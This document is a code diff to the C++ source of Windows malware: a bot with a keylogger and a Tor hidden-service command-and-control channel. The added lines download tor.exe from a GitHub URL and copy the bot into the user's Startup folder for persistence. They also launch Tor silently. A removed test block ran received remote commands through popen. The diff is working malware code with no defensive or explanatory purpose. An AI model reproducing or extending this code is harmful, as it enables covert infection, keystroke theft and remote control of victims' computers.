@@ -11,6 +11,7 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <filesystem>
+#include <wininet.h>
 #define MSG_NOSIGNAL        0
 #define MAX                 65536
 #define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
@@ -284,10 +285,74 @@ void keylog()
     }
 }
 
-void start_tor()
+static void start_tor()
 {
-    FILE *c_03 = popen("C:\\Windows\\Temp\\tor.exe", "r");
-    (void)pclose(c_03);
+    //FILE *c_03 = popen("C:\\Windows\\Temp\\tor.exe", "r");
+    //(void)pclose(c_03);
+    //system("C:\\Windows\\Temp\\tor.exe");
+    STARTUPINFO si{};
+    PROCESS_INFORMATION pi{};
+
+    si.cb = sizeof(si);
+    CreateProcess(nullptr, (LPSTR)"C:\\Windows\\Temp\\tor.exe", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
+}
+
+int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
+{
+	char buf[1024];
+    HINTERNET hUrl;
+
+    hUrl = InternetOpenUrl(hInet, url, NULL, 0, 0, 0);
+    if (hUrl == NULL) {
+        return 1;
+    }
+
+    int len;
+    int size = 0;
+    for (;;){
+        InternetReadFile(hUrl, buf, sizeof(buf), (LPDWORD)&len);
+        if (len <= 0) break;
+        fwrite(buf, sizeof(buf[0]), len, fp);
+        size += len;
+    }
+    InternetCloseHandle(hUrl);
+    return len;
+}
+
+void wget()
+{
+    HINTERNET hInet;
+    HINTERNET hFile;
+
+    FILE *fp;
+
+    hInet = InternetOpen("TEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+    hFile = InternetOpenUrl(hInet, "https://github.com/ware255/yuki/raw/main/bot/tor.exe", NULL, 0, 0, 0);
+    if (hFile == NULL) return;
+
+    fopen_s(&fp, "tor.exe", "wb");
+
+    if (wget(hInet, "https://github.com/ware255/yuki/raw/main/bot/tor.exe", fp) < 0) return;
+
+    InternetCloseHandle(hFile);
+    InternetCloseHandle(hInet);
+    fclose(fp);
+}
+
+void start_up(std::string str)
+{
+    std::string startup_directory = "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    std::string dir_place_worm = startup_directory + "\\" + str;
+    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" \"" + dir_place_worm + "*\" /Y";
+    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
+    FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
+    (void)pclose(c_01);
+    wget();
+    cmd_copy_worm_startup = "xcopy \".\\tor.exe\" C:\\Windows\\Temp\\tor.exe* /Y";
+    const char *cmd_copy_worm_startup_q = cmd_copy_worm_startup.c_str();
+    FILE *c_02 = popen(cmd_copy_worm_startup_q, "r");
+    (void)pclose(c_02);
 }
 
 int main(int argc, char **argv)
@@ -309,25 +374,10 @@ int main(int argc, char **argv)
     std::filesystem::path path = std::filesystem::current_path();
     std::string path_string{path.u8string() + "\\"};
     str.erase(str.find(path_string));
-    std::string startup_directory = "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string dir_place_worm = startup_directory + "\\" + str;
-    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" \"" + dir_place_worm + "*\" /Y";
-    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
-    FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
-    (void)pclose(c_01);
-    cmd_copy_worm_startup = "copy tor.exe C:\\Windows\\Temp\\tor.exe /Y";
-    const char *cmd_copy_worm_startup_q = cmd_copy_worm_startup.c_str();
-    FILE *c_02 = popen(cmd_copy_worm_startup_q, "r");
-    (void)pclose(c_02);
-    std::string startup_directory_del = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string n = "del " + startup_directory_del + "\\tor.exe\"";
-    FILE *c_04 = popen(n.c_str(), "r");
-    (void)pclose(c_04);
-    FILE *c_05 = popen("del tor.exe", "r");
-    (void)pclose(c_05);
-    std::thread th(start_tor);
-    th.join();
-    std::this_thread::sleep_for(std::chrono::seconds(90));
+    start_up(str);
+    std::thread th_a(start_tor);
+    th_a.join();
+    std::this_thread::sleep_for(std::chrono::seconds(120));
 
     WSADATA wsaData;
     char recv_buf[MAX] = {};
@@ -409,18 +459,6 @@ int main(int argc, char **argv)
             else if (!strcmp(recv_buf, "keylogger")) {
                 keylog();
             }
-#ifdef _TEST_
-            FILE *fp;
-            if ((fp = popen(recv_buf, "r")) == NULL) {
-                perror("can not exec commad");
-            }
-            while (!feof(fp)) {
-                strcat(t, send_buf);
-                fgets(send_buf, sizeof(send_buf), fp);
-            }
-            memcpy(send_buf, t, MAX);
-            (void)pclose(fp);
-#endif
             send(Socket, send_buf, strlen(send_buf), 0);
             memset(send_buf, 0, MAX*sizeof(send_buf[0]));
             send_buf[MAX] = {0};
